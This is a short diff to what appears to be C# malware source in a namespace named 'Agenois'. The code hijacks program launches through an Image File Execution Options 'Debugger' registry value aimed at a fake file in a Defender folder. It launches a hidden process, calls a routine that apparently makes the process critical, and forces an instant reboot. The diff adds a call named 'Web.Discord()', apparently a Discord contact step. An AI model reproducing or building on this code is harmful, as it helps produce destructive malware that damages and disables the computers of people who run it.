@@ -169,6 +169,8 @@ namespace Agenois
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\System32\IFEO.exe");
                 editKey.Close();
 
+                Web.Discord();
+
                 Process ScriptProcess = new Process();
                 ScriptProcess.StartInfo.CreateNoWindow = true;
                 ScriptProcess.StartInfo.UseShellExecute = false;
@@ -191,6 +193,7 @@ namespace Agenois
                 editKey.Close();
 
                 Destructive.CriticalMode(0);
+
                 Others.StartProcess("shutdown.exe", "/r /t 0");
             }
             else
